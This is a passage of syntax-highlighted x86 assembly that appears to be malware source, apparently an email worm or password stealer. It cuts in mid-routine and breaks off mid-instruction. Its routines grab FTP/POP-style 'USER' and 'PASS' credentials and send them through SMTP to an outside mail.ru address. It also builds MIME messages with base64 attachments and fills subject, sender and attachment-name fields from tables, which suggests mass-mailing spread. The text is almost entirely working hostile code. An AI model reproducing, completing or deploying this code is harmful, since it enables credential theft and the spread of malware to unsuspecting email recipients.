
   </span><span class="sc5">cp_pass</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cp_pass_x</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cp_pass</span><span class="sc0">

   </span><span class="sc5">cp_pass_x</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">send_pass</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_pass</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SSAP'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">send_pass_now</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">send_pass_now</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   PASS xxxx</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'   :'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'reli'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'aM-X'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;  tamanho do buffer</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;  offset pro buffer</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_user</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'RESU'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">user_not_found</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
   </span><span class="sc6">stosw</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc5">user_not_found</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">include_header_pass</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_pass</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SSAP'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exclude_header_pass</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">27</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RCPT TO: &lt;_pass_@mail.ru&gt;'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc5">exclude_header_pass</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_lstrlen</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">

   </span><span class="sc5">_ls1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_ls2</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_ls1</span><span class="sc0">

   </span><span class="sc5">_ls2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">q_mime_ini</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'Content-Type: '</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'multipart/mixed; boundary="==NEBTTNLCIAHMEDPLKEBHCBFD"'</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a0d0a0dh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'--==NEBTTNLCIAHMEDPLKEBHCBFD'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: application/octet-stream; name="'</span><span class="sc0">

   </span><span class="sc5">q_mime_ini_f1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; file name is here</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Disposition: attachment; filename="'</span><span class="sc0">

   </span><span class="sc5">q_mime_ini_f2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; file name is here</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a0d0a0dh</span><span class="sc0">

   </span><span class="sc5">q_mime_ini_f3</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; base64 file is here</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'--==NEBTTNLCIAHMEDPLKEBHCBFD--'</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

   </span><span class="sc5">q_mime_ini_f4</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">my_send</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  offset</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  size</span><span class="sc0">

   </span><span class="sc5">chk_send_sz</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">send_1024</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">;   size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">;   offset</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">  </span><span class="sc1">;   socket</span><span class="sc0">
   </span><span class="sc5">my_socket</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">chk_send_ret</span><span class="sc0">

   </span><span class="sc5">send_1024</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">             </span><span class="sc1">;   size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">;   offset</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">;   socket</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc5">chk_send_ret</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ver_send</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ver_send</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">ver_send</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">chk_send_sz</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">my_recv</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">recv_buffer</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">system_time</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">recv_buffer</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">my_recv_loop</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">my_recv_quit</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">my_recv_quit</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">my_recv_loop</span><span class="sc0">

   </span><span class="sc5">my_recv_quit</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">make_exe_name</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">exe_name</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">buffer_pass</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc5">system_time</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">exe_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">exe_name</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'subj'</span><span class="sc0">  </span><span class="sc1">;  Subject</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_subject</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'atta'</span><span class="sc0">  </span><span class="sc1">;  attachment name</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_attachment</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'mail'</span><span class="sc0">  </span><span class="sc1">;  From:</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_mail</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'msgs'</span><span class="sc0">  </span><span class="sc1">;  messages</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_msgs</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;   API GetUserDefaultLCID</span><span class="sc0">
</span><span class="sc1">;   sub al, 16h</span><span class="sc0">
</span><span class="sc1">;   jz country_brazuca</span><span class="sc0">

</span><span class="sc1">;   push offset buffer</span><span class="sc0">
</span><span class="sc1">;   call rotina</span><span class="sc0">

   </span><span class="sc5">do_attachment</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_extens000</span><span class="sc0"> </span><span class="sc1">;24</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;20</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_rename000</span><span class="sc0"> </span><span class="sc1">;16</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0"> </span><span class="sc1">;12</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   8  buffer</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">join_param</span><span class="sc0"> </span><span class="sc1">;4</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">do_subject</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_subject00</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">join_param</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">do_mail</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_msg_emailx000</span><span class="sc0"> </span><span class="sc1">;24</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc1">;20</span><span class="sc0">
